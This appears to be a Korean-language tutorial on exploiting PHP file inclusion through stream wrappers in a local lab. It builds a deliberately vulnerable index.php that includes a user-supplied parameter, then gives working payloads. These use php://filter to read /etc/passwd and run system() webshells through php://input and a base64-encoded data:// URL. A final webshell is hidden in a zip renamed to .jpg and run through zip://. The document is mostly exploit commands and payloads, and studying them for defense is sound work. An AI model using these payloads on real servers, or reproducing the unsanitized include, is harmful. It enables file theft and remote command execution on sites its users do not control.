# PHP wrapper

php는 다양한 [wrappers](https://www.php.net/manual/en/wrappers.php)를 지원한다.

그 중 php, zip, data를 이용하여 공격해보자.

| wrapper   | description                   |
| :---      | :---                          |
| php://    | Accessing various I/O streams |
| data://   | Data (RFC 2397)               |
| zip://    | Compression Streams           |

# **INDEX**

**1. [환경 구성](#환경-구성)**

**2. [php](#php)**

 - [filter](#filter)

 - [input](#input)

**3. [data](#data)**

**4. [zip](#zip)**


# **환경 구성**

실행 환경

| Type          | Version                   |
| :---          | :---                      |
| OS            | Ubuntu 20.04.3 LTS        |
| Architecture  | x86-64                    |
| IP            | 192.168.0.58              |
| apache2       | 2.4.41-4ubuntu3.10        |
| php           | 7.4                       |
| php-zip       | 2:7.4+75                  |

apache와 php를 설치하자.

```sh
root@ubuntu:~# apt -y install apache2 php
```

php wrapper에 대한 공격에 취약한 페이지(index.php)를 만들자.

```php
<?php
    if (empty($_GET['page'])) echo 'PHP wrapper';
    else include $_GET['page'];
?>
```


# **php**

## **filter**

php://filter/resource="file name"을 통해 서버의 로컬 파일을 읽을 수 있다.

    http://192.168.0.58/index.php?page=php://filter/resource=/etc/passwd

파일의 출력 결과를 base64나 rot13으로 문자열을 변환하여 읽을 수 있다.

    http://192.168.0.58/index.php?page=php://filter/convert.base64-encode/resource=/etc/passwd

    http://192.168.0.58/index.php?page=php://filter/string.rot13/resource=/etc/passwd


취약한 페이지가 다음과 같다면 NULL(%00)을 붙혀서 php가 아닌 다른 파일을 읽을 수 있었지만,

```php
include $_GET['page']."php";
```

[php 5.3.4 Release](https://www.php.net/releases/5_3_4.php)부터는 NULL을 넣어도 우회할 수 없게 되었다.

## **input**

php://input을 이용하여 php 함수를 실행시킬 수 있으며, POST 방식으로 데이터를 넣어주어야 한다.

php://input을 사용하기 위해서는 php.ini의 allow_url_include가 On로 되어 있어야 한다.

    curl -X POST --data "<?php system(\$_GET['cmd']); ?>" "http://192.168.0.58/index.php?page=php://input&cmd=id"


# **data**

data wrapper를 사용하기 위해서는 php.ini의 allow_url_include가 On로 되어 있어야 한다.

data://text/plain,"문자열"을 통해 html문서를 출력할 수 있지만

php 함수를 통해 운영체제의 명령어를 실행시킬 수 있다.

    http://192.168.0.58/index.php?page=data://text/plain,<?php system($_GET['cmd']);?>&cmd=id

php 데이터를 base64로 인코딩하여 실행시킬 수도 있다.

    http://192.168.0.58/index.php?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4=&cmd=id

# **zip**

zip wrapper를 사용하기 위해서 추가적인 패키지를 설치하자.

```sh
root@ubuntu:~# apt -y install php-zip
```

패키지가 설치되었다면 php.ini에서 extension=zip.so가 활성화되어 있어야 한다.

zip wrapper로 압축파일 속 파일을 실행시킬 수 있는데, 그러기 위한 디렉토리 쓰기 권한이 있어야 한다.

apache2의 계정(www-data)이 압축을 풀 디렉토리의 권한을 주자.

```sh
root@ubuntu:~# chown www-data:www-data /var/www/html
```

압축파일에 넣을 php를 작성하자.

```php
<?php system($_GET['cmd']);?>
```

해당 파일을 압축하고 shell.php를 지워버리자.

```sh
root@ubuntu:/var/www/html# zip shell.zip shell.php
root@ubuntu:/var/www/html# rm -rf shell.php
```

이후 zip://"zip file name"#"file name"을 통해 zip안의 파일을 실행시킬 수 있다.

    http://192.168.0.58/index.php?page=zip://shell.zip%23shell.php&cmd=id

파일의 확장자를 변경해도 상관없다.

```sh
root@ubuntu:/var/www/html# mv shell.zip shell.jpg
```

    http://192.168.0.58/index.php?page=zip://shell.jpg%23shell.php&cmd=id
